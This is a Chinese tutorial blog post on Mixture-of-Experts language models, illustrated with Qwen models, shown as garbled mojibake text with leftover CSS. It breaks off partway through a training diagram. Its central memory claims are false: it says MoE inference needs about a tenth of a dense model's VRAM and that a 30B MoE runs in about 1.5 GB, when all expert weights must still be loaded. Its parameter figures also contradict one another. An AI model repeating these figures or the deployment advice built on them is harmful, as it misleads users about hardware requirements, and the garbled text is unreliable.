h1{font-size:20px;margin-top:30px;margin-bottom:10px;padding-left:30px;position:relative}.markdown-body h1&gt;code{font-size:20px}.markdown-body h1:before{content:"ğŸº";display:block;font-size:18px;width:18px;height:18px;left:0;position:absolute}.markdown-body h2{font-size:18px;margin-top:30px;margin-bottom:10px;padding-left:28px;position:relative}.markdown-body h2&gt;code{font-size:18px}.markdown-body h2:before{content:"ğŸ»";display:block;font-size:16px;width:16px;height:16px;left:0;position:absolute}.markdown-body h3{font-size:16px;margin-top:30px;margin-bottom:10px;padding-left:26px;position:relative}.markdown-body h3&gt;code{font-size:16px}.markdown-body h3:before{content:"ğŸ¥‚";display:block;font-size:14px;width:14px;height:14px;left:0;position:absolute}.markdown-body h4{font-size:14px;margin-top:30px;margin-bottom:10px;padding-left:24px;position:relative}.markdown-body h4&gt;code{font-size:14px}.markdown-body h4:before{content:"ğŸ¥ƒ";display:block;font-size:12px;width:12px;height:12px;left:0;position:absolute}.markdown-body h5{font-size:12px;margin-top:30px;margin-bottom:10px}.markdown-body h5&gt;code{font-size:12px}.markdown-body h6{font-size:10px;margin-top:30px;margin-bottom:10px}.markdown-body h6&gt;code{font-size:10px}.markdown-body h1,.markdown-body h2{color:#ff502c}.markdown-body hr{height:4px;border:none;margin-top:32px;margin-bottom:32px;background-size:4px 1px;background-image:linear-gradient(270deg,#6d9dce,#8cc0f3 25%,transparent 50%)}.markdown-body hr:nth-child(2n){background-image:linear-gradient(270deg,#ff9800,#fff8e0 25%,transparent 50%)}.markdown-body ul{padding-inline-start:20px}.markdown-body ul li{list-style-type:"ğŸ”¸"}.markdown-body ul li li{list-style-type:"â—»ï¸"}.markdown-body ul li li li{list-style-type:"â–«ï¸"}.markdown-body ol{padding-inline-start:20px}.markdown-body ol ::marker{color:#ff9800}.markdown-body ol,.markdown-body ul{line-height:2em}.markdown-body li{padding-inline-start:1ch}.markdown-body li.task-list-item{list-style:none;padding-inline-start:0}.markdown-body li input{padding-right:2px}.markdown-body li input[type=checkbox i]{appearance:none}.markdown-body li input:before{content:"ğŸŸ©";display:block;width:13px;height:13px}.markdown-body li input:checked:before{content:"âœ…"}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-estuary-dark">.hljs-comment,.hljs-quote{color:#878573}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ba6236}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#ae7313}.hljs-bullet,.hljs-string,.hljs-symbol{color:#7d9726}.hljs-section,.hljs-title{color:#36a166}.hljs-keyword,.hljs-selector-tag{color:#5f9182}.hljs-addition,.hljs-deletion{color:#22221b;display:inline-block;width:100%}.hljs-deletion{background-color:#ba6236}.hljs-addition{background-color:#7d9726}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#22221b;color:#929181}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¤§æ¨¡å‹ MoE,ä½ æ˜ç™½äº†ä¹ˆï¼Ÿ</h2>
<blockquote>
<p>æœ€è¿‘è¢«T4å¡æå¾—æœ‰ç‚¹æŠ½é£å°±å¤šäº›ä¸€ç‚¹å…³äºå¤§æ¨¡å‹çš„è®²è§£çš„ã€‚ç”±æµ…è‡³æ·±çš„è®²ä¸ªé€ï¼Œæ„¿å¤©ä¸‹ç”¨è€æ—§æ˜¾å¡çš„äººå„¿éƒ½å¯ä»¥è¿œç¦»å‚»*é—®é¢˜ã€‚</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e53064d7b28447568f9ce11ce5ee2bec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC05L2z5rWp:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766076341&amp;x-signature=xwaGFHtHHls3TOo8vvj%2B11FnIPU%3D" alt="image.png" loading="lazy"/></p>
<p><strong>ä½œè€…ï¼šå´ä½³æµ©</strong></p>
<p><strong>æœ€åæ›´æ–°ï¼š2025-12-11</strong></p>
<p><strong>é€‚ç”¨äººç¾¤ï¼šå¤§æ¨¡å‹ä¸Šä¸‹æ¸¸ç›¸å…³ä»ä¸šè€…</strong></p>
<p><strong>â€”â€”ä»¥ Qwen2/Qwen3 ä¸ºä¾‹ï¼Œä»å…¥é—¨åˆ°å›å®¶</strong></p>
<hr/>
<h3 data-id="heading-1">1. ä»€ä¹ˆæ˜¯ MoEï¼ˆMixture of Expertsï¼‰</h3>
<h4 data-id="heading-2">æ ¸å¿ƒæ¦‚å¿µ</h4>
<p><strong>MoE = æ··åˆä¸“å®¶æ¨¡å‹</strong>ï¼Œå®ƒè®©æ¨¡å‹ç”±å¤šä¸ª"ä¸“å®¶ç½‘ç»œ"ç»„æˆï¼Œæ¯æ¬¡æ¨ç†åªæ¿€æ´»å°‘é‡ä¸“å®¶ï¼Œä»è€Œå®ç°ï¼š</p>
<ul>
<li>âœ… <strong>ä¿ç•™å¤§æ¨¡å‹èƒ½åŠ›</strong> - æ€»å‚æ•°é‡å¤§ï¼Œèƒ½åŠ›å¼º</li>
<li>âœ… <strong>é™ä½æ¨ç†æˆæœ¬</strong> - åªæ¿€æ´»éƒ¨åˆ†å‚æ•°ï¼Œè®¡ç®—é‡å°</li>
<li>âœ… <strong>æå‡é¢†åŸŸèƒ½åŠ›</strong> - ä¸“å®¶å„å¸å…¶èŒï¼Œæœ¯ä¸šæœ‰ä¸“æ”»</li>
</ul>
<h4 data-id="heading-3">æ ¸å¿ƒç†å¿µ</h4>
<blockquote>
<p>ğŸ’¡ ä¸éœ€è¦æ¯ä¸ª token éƒ½ç”¨ 300 äº¿å‚æ•°è®¡ç®—ï¼Œè€Œæ˜¯åªè°ƒç”¨å…¶ä¸­æœ€é€‚åˆè§£å†³è¯¥é—®é¢˜çš„ä¸“å®¶ã€‚</p>
</blockquote>
<p>è¿™å°±åƒä¸€ä¸ªåŒ»é™¢ï¼š</p>
<ul>
<li>ä½ å¤´ç–¼ä¸éœ€è¦å¬é›†æ‰€æœ‰ç§‘å®¤åŒ»ç”Ÿ</li>
<li>åªéœ€è¦ç¥ç»ç§‘ä¸“å®¶è¯Šæ–­</li>
<li>ä½†åŒ»é™¢ä»ç„¶æ‹¥æœ‰å…¨ç§‘èƒ½åŠ›</li>
</ul>
<h4 data-id="heading-4">ä¸ºä»€ä¹ˆéœ€è¦ MoEï¼Ÿ</h4>
<p>Dense æ¨¡å‹çš„é—®é¢˜ï¼š</p>















<table><thead><tr><th>å‚æ•°é‡</th><th>æ¨ç†éœ€è¦æ¿€æ´»</th><th>æ˜¾å­˜éœ€æ±‚</th></tr></thead><tbody><tr><td>70B</td><td>å…¨ 70B</td><td>æé«˜ï¼ˆ&gt;140GB FP16ï¼‰</td></tr></tbody></table>
<p>MoE çš„æ”¹è¿›ï¼š</p>















<table><thead><tr><th>æ€»å‚æ•°é‡</th><th>æ¯æ¬¡æ¿€æ´»</th><th>å®é™…æ¨ç†æˆæœ¬</th></tr></thead><tbody><tr><td>70Bï¼ˆå«16ä¸ªä¸“å®¶ï¼‰</td><td>Top-1=3B</td><td>åƒè·‘ 3B æ¨¡å‹ä¸€æ · cheap</td></tr></tbody></table>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼šé€‰å¯¹ä¸“å®¶ï¼Œè€Œä¸æ˜¯è®¡ç®—å…¨éƒ¨ä¸“å®¶ã€‚</strong></p>
<hr/>
<h3 data-id="heading-5">2. MoE æ¶æ„å…¨æ™¯</h3>
<h4 data-id="heading-6">2.1 åŸºç¡€æ¶æ„æµç¨‹</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[è¾“å…¥ Token:&lt;br/&gt;å†™ä¸€æ®µ Python ä»£ç ] --&gt; B{Router è·¯ç”±å™¨&lt;br/&gt;åˆ†æ token ç‰¹å¾}

    B --&gt;|æƒé‡ 0.8| C1[Expert 1&lt;br/&gt;ä»£ç ä¸“å®¶]
    B --&gt;|æƒé‡ 0.2| C2[Expert 5&lt;br/&gt;é€»è¾‘ä¸“å®¶]

    B -.ä¸æ¿€æ´».-&gt; C3[Expert 2]
    B -.ä¸æ¿€æ´».-&gt; C4[Expert 3]
    B -.ä¸æ¿€æ´».-&gt; C5[Expert 4]

    C1 --&gt; D[åŠ æƒåˆå¹¶è¾“å‡º]
    C2 --&gt; D
    D --&gt; E[æœ€ç»ˆè¾“å‡º]

    style B fill:#FFD700
    style C1 fill:#90EE90
    style C2 fill:#90EE90
    style C3 fill:#E0E0E0
    style C4 fill:#E0E0E0
    style C5 fill:#E0E0E0
</code></pre>
<p><strong>å…³é”®è¦ç´ è§£é‡Šï¼š</strong></p>
<ol>
<li><strong>Routerï¼ˆè·¯ç”±å™¨ï¼‰</strong> - æ ¹æ®è¾“å…¥å†…å®¹é€‰æ‹©æœ€é€‚åˆçš„ä¸“å®¶ï¼ˆTop-1 / Top-2ï¼‰</li>
<li><strong>Expertsï¼ˆä¸“å®¶ï¼‰</strong> - æ¯ä¸ªéƒ½æ˜¯ç‹¬ç«‹çš„ FFN ç½‘ç»œï¼Œæ‹¥æœ‰ä¸“å±å‚æ•°</li>
<li><strong>é€‰æ‹©æ€§æ¿€æ´»</strong> - åªæ¿€æ´»éƒ¨åˆ†ä¸“å®¶ï¼Œå…¶ä½™ä¸“å®¶åœ¨å½“å‰ token ä¸å‚ä¸è¿ç®—</li>
<li><strong>åŠ æƒåˆå¹¶</strong> - å°†æ¿€æ´»ä¸“å®¶çš„è¾“å‡ºæŒ‰æƒé‡æ±‚å’Œ</li>
</ol>
<hr/>
<h4 data-id="heading-7">2.2 å®Œæ•´ Transformer å±‚ç»“æ„</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph "ä¼ ç»Ÿ Transformer å±‚"
        A1[Input] --&gt; A2[Multi-Head Attention]
        A2 --&gt; A3[Add &amp; Norm]
        A3 --&gt; A4[Dense FFN&lt;br/&gt;æ‰€æœ‰å‚æ•°æ¿€æ´»]
        A4 --&gt; A5[Add &amp; Norm]
        A5 --&gt; A6[Output]
    end
    
    subgraph "MoE Transformer å±‚"
        B1[Input] --&gt; B2[Multi-Head Attention]
        B2 --&gt; B3[Add &amp; Norm]
        B3 --&gt; B4{MoE Layer&lt;br/&gt;è·¯ç”±å™¨é€‰æ‹©}
        B4 --&gt; B5[Expert 1]
        B4 --&gt; B6[Expert 2]
        B4 -.-&gt; B7[Expert N]
        B5 --&gt; B8[Sparse Activation&lt;br/&gt;ä»…éƒ¨åˆ†ä¸“å®¶æ¿€æ´»]
        B6 --&gt; B8
        B7 -.-&gt; B8
        B8 --&gt; B9[Add &amp; Norm]
        B9 --&gt; B10[Output]
    end
    
    style A4 fill:#FFB6C1
    style B4 fill:#87CEEB
    style B8 fill:#90EE90
</code></pre>
<p><strong>å¯¹æ¯”è¦ç‚¹ï¼š</strong></p>
<ul>
<li>ä¼ ç»Ÿæ¨¡å‹ï¼šFFN å±‚æ‰€æœ‰å‚æ•°éƒ½å‚ä¸è®¡ç®—</li>
<li>MoE æ¨¡å‹ï¼šç”¨å¤šä¸“å®¶ + è·¯ç”±å™¨æ›¿ä»£ Dense FFN</li>
</ul>
<hr/>
<h3 data-id="heading-8">3. Dense æ¨¡å‹ vs MoE æ¨¡å‹ï¼šæ˜¾å­˜ä¸è®¡ç®—å¯¹æ¯”</h3>
<h4 data-id="heading-9">3.1 ä»€ä¹ˆæ˜¯ Denseï¼ˆç¨ å¯†æ¨¡å‹ï¼‰</h4>
<p><strong>Dense = æ‰€æœ‰å‚æ•°å…¨éƒ¨å‚ä¸æ¨ç†</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[è¾“å…¥] --&gt; B[Layer 1&lt;br/&gt;32B å‚æ•°]
    B --&gt; C[Layer 2&lt;br/&gt;32B å‚æ•°]
    C --&gt; D[Layer 3&lt;br/&gt;32B å‚æ•°]
    D --&gt; E[è¾“å‡º]
    
    style B fill:#FF6B6B
    style C fill:#FF6B6B
    style D fill:#FF6B6B
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<ul>
<li>Qwen2.5-32B Dense
<ul>
<li>
<p>æ¨ç†æ—¶ 32B å…¨æ¿€æ´»</p>
</li>
<li>
<p>æ˜¾å­˜å ç”¨ 60+ GBï¼ˆFP16ï¼‰</p>
</li>
<li>
<p>æ€§èƒ½å¼ºä½†æˆæœ¬é«˜</p>
</li>
</ul>
</li>
</ul>
<p>æ˜¾å­˜å¯¹æ¯”è¡¨ï¼š</p>


























<table><thead><tr><th>æ¨¡å‹</th><th>FP16</th><th>FP8</th><th>INT8</th><th>INT4</th></tr></thead><tbody><tr><td><strong>Qwen3 Dense 32B</strong>ï¼ˆå…¨æ¿€æ´»ï¼‰</td><td>60+ GB</td><td>30 GB</td><td>28 GB</td><td>15 GB</td></tr><tr><td><strong>Qwen3 MoE 30B</strong>ï¼ˆæ¿€æ´» ~3Bï¼‰</td><td>6 GB</td><td>3 GB</td><td>3 GB</td><td>1.5 GB</td></tr></tbody></table>
<p>ğŸ‘‰ <strong>MoE æ¨ç†æ˜¾å­˜ â‰ˆ Dense çš„ 1/10~1/20</strong></p>
<hr/>
<h4 data-id="heading-10">3.2 ä»€ä¹ˆæ˜¯ MoEï¼ˆæ··åˆä¸“å®¶æ¨¡å‹ï¼‰</h4>
<p><strong>MoE = æ€»å‚æ•°å¤§ï¼Œä½†æ¯æ¬¡åªæ¿€æ´»å°‘é‡ä¸“å®¶</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[Input] --&gt; B[Layer 1&lt;br/&gt;Total Params 30B]
    B --&gt; C{Router&lt;br/&gt;Select Top-2}

    C --&gt;|Active| D1[Expert 1&lt;br/&gt;1.5B]
    C --&gt;|Active| D2[Expert 5&lt;br/&gt;1.5B]
    C -.-&gt; D3[Other Experts&lt;br/&gt;Not Activated&lt;br/&gt;27B]

    D1 --&gt; E[Merge Output]
    D2 --&gt; E
    E --&gt; F[Next Layer]

    style D1 fill:#90EE90
    style D2 fill:#90EE90
    style D3 fill:#E0E0E0

</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<ul>
<li>Qwen1.5-MoE-33B
<ul>
<li>æ€»å‚æ•°ï¼š33B</li>
<li>æ¿€æ´»ä¸“å®¶ï¼šTop-1ï¼ˆçº¦ 3Bï¼‰</li>
<li>æ˜¾å­˜å ç”¨ï¼š~6GBï¼ˆFP16ï¼‰</li>
<li>æ¨ç†æˆæœ¬ â‰ˆ 3B Dense æ¨¡å‹</li>
</ul>
</li>
</ul>
<hr/>
<h4 data-id="heading-11">3.3 æ˜¾å­˜å ç”¨å¯¹æ¯”è¡¨ï¼ˆé‡è¦ï¼ï¼‰</h4>
<p>ä»¥ <strong>Qwen3 32B Dense</strong> &amp; <strong>Qwen3 30B MoE</strong> ä¸ºä¾‹ï¼š</p>


























<table><thead><tr><th>æ¨¡å‹é…ç½®</th><th>FP16ï¼ˆå…¨ç²¾åº¦ï¼‰</th><th>FP8</th><th>INT8</th><th>INT4</th></tr></thead><tbody><tr><td><strong>Qwen3 Dense 32B</strong><br/>ï¼ˆå…¨å‚æ•°æ¿€æ´»ï¼‰</td><td>60+ GB</td><td>~30 GB</td><td>~28 GB</td><td>~15 GB</td></tr><tr><td><strong>Qwen3 MoE 30B</strong><br/>ï¼ˆæ¿€æ´» 3Bï¼‰</td><td>~6 GB</td><td>~3 GB</td><td>~3 GB</td><td>~1.5 GB</td></tr></tbody></table>
<pre><code class="hljs language-mermaid" lang="mermaid">gantt
    title æ˜¾å­˜å ç”¨å¯¹æ¯”ï¼ˆGBï¼‰
    dateFormat X
    axisFormat %s
    section 30B æ¨¡å‹
    FP16  :0, 60
    FP8   :0, 30
    INT8  :0, 28
    INT4  :0, 15
    section 3B æ¨¡å‹
    FP16  :0, 6
    FP8   :0, 3
    INT8  :0, 3
    INT4  :0, 1.5
</code></pre>
<p><strong>ç»“è®ºï¼š</strong></p>
<blockquote>
<p>âš¡ <strong>MoE æ¨ç†æ˜¾å­˜æ¶ˆè€— â‰ˆ Dense çš„ 1/10</strong></p>
</blockquote>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li><strong>Dense</strong>ï¼šæ‰€æœ‰å±‚ã€æ‰€æœ‰å‚æ•°éƒ½è¦å‚ä¸è®¡ç®—</li>
<li><strong>MoE</strong>ï¼šæ¯å±‚åªç”¨å°‘æ•°ä¸“å®¶ï¼ˆå¦‚æ¿€æ´» 3Bï¼‰</li>
</ul>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ <strong>30B MoE å¯ä»¥åœ¨æ¶ˆè´¹çº§æ˜¾å¡è¿è¡Œ</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-12">4. MoE çš„å…³é”®æ¦‚å¿µ</h3>
<h4 data-id="heading-13">4.1 ä¸“å®¶æ•°é‡ï¼ˆExpertsï¼‰</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap
  root((MoE ä¸“å®¶æ± &lt;br/&gt;16 ä¸ªä¸“å®¶))
    Expert 1
      æ¨ç†èƒ½åŠ›
      é€»è¾‘åˆ†æ
    Expert 2
      åˆ›æ„å†™ä½œ
      æ•…äº‹åˆ›ä½œ
    Expert 3
      æ•°å­¦è®¡ç®—
      å…¬å¼æ¨å¯¼
    Expert 4
      ä»£ç ç”Ÿæˆ
      ç®—æ³•å®ç°
    Expert 5
      è¯­è¨€ç¿»è¯‘
      å¤šè¯­è¨€ç†è§£
    Expert 6~16
      å…¶ä»–é¢†åŸŸ
      åŠ¨æ€åˆ†å·¥
</code></pre>
<p><strong>ä¸“å®¶åˆ†å·¥ç¤ºä¾‹ï¼š</strong></p>
<ul>
<li>Expert 1ï¼šæ¨ç†ã€é€»è¾‘åˆ†æ</li>
<li>Expert 3ï¼šæ•°å­¦ã€è®¡ç®—</li>
<li>Expert 5ï¼šä»£ç ç”Ÿæˆ</li>
<li>Expert 7ï¼šè¯­è¨€ç¿»è¯‘</li>
<li>Expert 10ï¼šåˆ›æ„å†™ä½œ</li>
<li>â€¦</li>
</ul>
<hr/>
<h4 data-id="heading-14">4.2 Top-Kï¼ˆæ¿€æ´»ä¸“å®¶æ•°é‡ï¼‰</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[è¾“å…¥ Token] --&gt; B{Router æ‰“åˆ†}
    B --&gt; C[ä¸“å®¶å¾—åˆ†æ’åº]
    
    subgraph "Top-1 ç­–ç•¥"
        C --&gt; D1[é€‰æ‹©å¾—åˆ†æœ€é«˜çš„ 1 ä¸ªä¸“å®¶]
        D1 --&gt; E1[é€Ÿåº¦æœ€å¿«&lt;br/&gt;æˆæœ¬æœ€ä½]
    end
    
    subgraph "Top-2 ç­–ç•¥"
        C --&gt; D2[é€‰æ‹©å¾—åˆ†æœ€é«˜çš„ 2 ä¸ªä¸“å®¶]
        D2 --&gt; E2[æ€§èƒ½æ›´å¥½&lt;br/&gt;æˆæœ¬é€‚ä¸­]
    end
    
    style D1 fill:#90EE90
    style D2 fill:#87CEEB
</code></pre>
<p><strong>å¸¸è§é…ç½®ï¼š</strong></p>
<ul>
<li><strong>Top-1</strong>ï¼šæ¯æ¬¡æ¿€æ´» 1 ä¸ªä¸“å®¶ï¼ˆé€Ÿåº¦å¿«ï¼‰</li>
<li><strong>Top-2</strong>ï¼šæ¯æ¬¡æ¿€æ´» 2 ä¸ªä¸“å®¶ï¼ˆæ€§èƒ½å¥½ï¼‰</li>
</ul>
<hr/>
<h4 data-id="heading-15">4.3 å‚æ•°å…³ç³»å›¾</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[MoE æ¨¡å‹&lt;br/&gt;æ€»å‚æ•° 30B] --&gt; B[å…± 16 ä¸ªä¸“å®¶]
    B --&gt; C1[Expert 1&lt;br/&gt;1.9B å‚æ•°]
    B --&gt; C2[Expert 2&lt;br/&gt;1.9B å‚æ•°]
    B --&gt; C3[Expert 3&lt;br/&gt;1.9B å‚æ•°]
    B --&gt; C4[...]
    B --&gt; C5[Expert 16&lt;br/&gt;1.9B å‚æ•°]
    
    D[æ¨ç†æ—¶ Top-1] --&gt; E[åªæ¿€æ´» 1 ä¸ªä¸“å®¶&lt;br/&gt;çº¦ 3B å‚æ•°]
    E --&gt; F[å…¶ä½™ 15 ä¸ªä¸“å®¶&lt;br/&gt;ä¸å‚ä¸è®¡ç®—]
    
    style E fill:#90EE90
    style F fill:#E0E0E0
</code></pre>
<p><strong>å…³é”®å…¬å¼ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">æ€»å‚æ•° = ä¸“å®¶æ•°é‡ Ã— å•ä¸“å®¶å‚æ•° + å…±äº«å‚æ•°
æ¿€æ´»å‚æ•° = <span class="hljs-attribute">Top</span>-K Ã— å•ä¸“å®¶å‚æ•° + å…±äº«å‚æ•°
æ¨ç†æˆæœ¬ âˆ æ¿€æ´»å‚æ•°ï¼ˆè€Œéæ€»å‚æ•°ï¼‰
</code></pre>
<hr/>
<h3 data-id="heading-16">5. å¸¸è§ç–‘é—®ï¼šæ²¡æ¿€æ´»çš„ä¸“å®¶æ˜¯ä¸æ˜¯æµªè´¹ï¼Ÿ</h3>
<h4 data-id="heading-17">âŒ é”™è¯¯ç†è§£</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[ç”¨æˆ·æé—®] --&gt; B[æ¿€æ´» Expert 4&lt;br/&gt;ä»£ç ä¸“å®¶]
    B --&gt; C[å…¶ä»– 15 ä¸ªä¸“å®¶&lt;br/&gt;å®Œå…¨æ²¡ç”¨?]
    
    style C fill:#FFB6C1
</code></pre>
<h4 data-id="heading-18">âœ… æ­£ç¡®ç†è§£</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    A[MoE ä¸“å®¶æ± ] --&gt; B[ä¸åŒä»»åŠ¡è§¦å‘ä¸åŒä¸“å®¶]
    
    B --&gt; C1[ä»»åŠ¡ 1: å†™ä»£ç &lt;br/&gt;è§¦å‘ Expert 4]
    B --&gt; C2[ä»»åŠ¡ 2: æ•°å­¦é¢˜&lt;br/&gt;è§¦å‘ Expert 3]
    B --&gt; C3[ä»»åŠ¡ 3: ç¿»è¯‘&lt;br/&gt;è§¦å‘ Expert 7]
    B --&gt; C4[ä»»åŠ¡ 4: åˆ›ä½œ&lt;br/&gt;è§¦å‘ Expert 2]
    
    C1 --&gt; D[æ‰€æœ‰ä¸“å®¶éƒ½ä¼šè¢«ä½¿ç”¨&lt;br/&gt;åªæ˜¯æ—¶æœºä¸åŒ]
    C2 --&gt; D
    C3 --&gt; D
    C4 --&gt; D
    
    style D fill:#90EE90
</code></pre>
<p><strong>çœŸç›¸ï¼š</strong></p>
<ol>
<li><strong>è®­ç»ƒæ—¶</strong> - æ‰€æœ‰ä¸“å®¶éƒ½ä¼šè¢«æ¿€æ´»å¹¶å­¦ä¹ </li>
<li><strong>æ¨ç†æ—¶</strong> - æ ¹æ®ä»»åŠ¡åŠ¨æ€é€‰æ‹©æœ€åˆé€‚çš„ä¸“å®¶</li>
<li><strong>é•¿æœŸä½¿ç”¨</strong> - æ¯ä¸ªä¸“å®¶éƒ½ä¼šåœ¨å„è‡ªæ“…é•¿çš„é¢†åŸŸå‘å…‰</li>
</ol>
<p><strong>ç±»æ¯”ï¼š</strong></p>
<blockquote>
<p>ğŸ¥ åŒ»é™¢æœ‰ 16 ä¸ªç§‘å®¤ï¼Œä½ çœ‹ç—…åªæŒ‚ 1 ä¸ªç§‘å®¤ï¼Œä½†å…¶ä»–ç§‘å®¤ä¸æ˜¯æµªè´¹ï¼Œè€Œæ˜¯åœ¨æœåŠ¡å…¶ä»–æ‚£è€…ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-19">6. Qwen3ï¼ˆDense / MoEï¼‰éƒ¨ç½²æ¨èæ–¹æ¡ˆ</h3>
<h4 data-id="heading-20">åœºæ™¯åˆ†æ</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[ä½ çš„ç¡¬ä»¶æ¡ä»¶?] --&gt; B{æ˜¾å¡æ˜¾å­˜}
    
    B --&gt;|24GB æ¶ˆè´¹çº§| C[æ¨èæ–¹æ¡ˆ 1]
    B --&gt;|48GB ä¸“ä¸šå¡| D[æ¨èæ–¹æ¡ˆ 2]
    B --&gt;|80GB+ æœåŠ¡å™¨| E[æ¨èæ–¹æ¡ˆ 3]
    
    C --&gt; C1["Qwen3-14B Dense FP8 æ˜¾å­˜: ~14GB æ€§èƒ½: å¼º"]
    C --&gt; C2["Qwen1.5-MoE-33B INT4 æ˜¾å­˜: ~1.5GB æ€§èƒ½: ä¸­ä¸Š"]
    
    D --&gt; D1["Qwen3-32B Dense FP8 æ˜¾å­˜: ~30GB æ€§èƒ½: æå¼º"]
    
    E --&gt; E1["Qwen3-72B Dense FP8 æ˜¾å­˜: ~72GB æ€§èƒ½: é¡¶çº§"]
    
    style C1 fill:#90EE90
    style C2 fill:#87CEEB
    style D1 fill:#FFD700
    style E1 fill:#FF6B6B
</code></pre>
<hr/>
<h4 data-id="heading-21">æ–¹æ¡ˆ 1ï¼šæ³¨é‡æ€§èƒ½ï¼ˆæ¨èï¼‰</h4>
<p><strong>Qwen3-14B Denseï¼ˆINT4 æˆ– FP8ï¼‰</strong></p>





























<table><thead><tr><th>ç²¾åº¦</th><th>æ˜¾å­˜å ç”¨</th><th>æ¨èæŒ‡æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>FP16</td><td>~28GB</td><td>âŒ</td><td>è¶…å‡º 24GB æ˜¾å­˜</td></tr><tr><td><strong>FP8</strong></td><td><strong>~14GB</strong></td><td>â­â­â­â­â­</td><td><strong>å¼ºçƒˆæ¨è</strong></td></tr><tr><td>INT4</td><td>~7GB</td><td>â­â­â­â­</td><td>è½»é‡çº§æœ€ä½³</td></tr></tbody></table>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>æ€§èƒ½æ˜¾è‘—å¼ºäº 7B</li>
<li>æ€§ä»·æ¯” &gt; 70%</li>
<li>é€‚åˆæ—¥å¸¸å¯¹è¯ã€ä»£ç ç”Ÿæˆ</li>
</ul>
<hr/>
<h4 data-id="heading-22">æ–¹æ¡ˆ 2ï¼šå¤§æ¨¡å‹èƒ½åŠ› + å°æ˜¾å­˜</h4>
<p><strong>Qwen1.5-MoE-33Bï¼ˆINT4ï¼‰</strong></p>





















<table><thead><tr><th>æŒ‡æ ‡</th><th>æ•°å€¼</th></tr></thead><tbody><tr><td>æ€»å‚æ•°</td><td>33B</td></tr><tr><td>æ¿€æ´»å‚æ•°</td><td>~3B</td></tr><tr><td>æ˜¾å­˜å ç”¨</td><td>~1.5GB (INT4)</td></tr></tbody></table>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>âœ… æ˜¾å­˜å ç”¨æä½ï¼ˆ4GB æ˜¾å¡å¯è·‘ï¼‰</li>
<li>âœ… æ¨ç†é€Ÿåº¦å¿«</li>
<li>âœ… æ€§èƒ½æ¥è¿‘ 30B Denseï¼ˆå°¤å…¶ä¸­æ–‡ã€æ¨ç†ï¼‰</li>
</ul>
<p><strong>åŠ£åŠ¿ï¼š</strong></p>
<ul>
<li>âš ï¸ ç‰¹å®šä»»åŠ¡æ•ˆæœå¯èƒ½ä¸å¦‚ Dense ç²¾ç»†</li>
</ul>
<hr/>
<h4 data-id="heading-23">æ–¹æ¡ˆ 3ï¼šä¼ä¸šçº§æ——èˆ°</h4>
<p><strong>Qwen3-72B Denseï¼ˆFP8ï¼‰</strong></p>
<p><strong>ç¡¬ä»¶è¦æ±‚ï¼š</strong></p>
<ul>
<li>A100 80GB / H100</li>
<li>æˆ–å¤šå¡ 80GB GPU</li>
</ul>
<p><strong>æ€§èƒ½ï¼š</strong></p>
<ul>
<li>Top çº§åˆ«</li>
<li>é€‚åˆä¼ä¸šçº§åº”ç”¨</li>
</ul>
<hr/>
<h3 data-id="heading-24">7. MoE çš„è®­ç»ƒæœºåˆ¶ï¼ˆè¿›é˜¶ï¼‰</h3>
<h4 data-id="heading-25">7.1 è®­ç»ƒæµç¨‹å›¾</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant D as è®­ç»ƒæ•°æ®
    participant R as Router&lt;br/&gt;è·¯ç”±å™¨
    participant E1 as Expert 1
    participant E2 as Expert 2
    participant L as Loss&lt;br/&gt;æŸå¤±å‡½æ•°
    
    D-&gt;&gt;R: è¾“å…¥ Token
    R-&gt;&gt;R: è®¡ç®—ä¸“å®¶å¾—åˆ†
    R-&gt;&gt;E1: æ¿€æ´» (æƒé‡ 0.7)
    R-&gt;&gt;E2: æ¿€æ´» (æƒé‡ 0.3)
    E1-&gt;&gt;L: è¾“å‡º O1
    E2-&gt;&gt;L: è¾“å‡º O2
    L-&gt;&gt;L: è®¡ç®—ä»»åŠ¡æŸå¤±&lt;br/&gt;+ è´Ÿè½½å‡è¡¡æŸå¤±
    L--&gt;&gt;E1: åå‘ä¼ æ’­æ›´æ–°
    L--&gt;&gt;E2: åå‘ä¼ æ’­æ›´æ–°
    L--&gt;&gt;R: æ›´æ–°è·¯ç”±å‚æ•°
</code></pre>
<hr/>
<h4 data-id="heading-26">7.2 è·¯ç”±å™¨è®­ç»ƒæœºåˆ¶</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
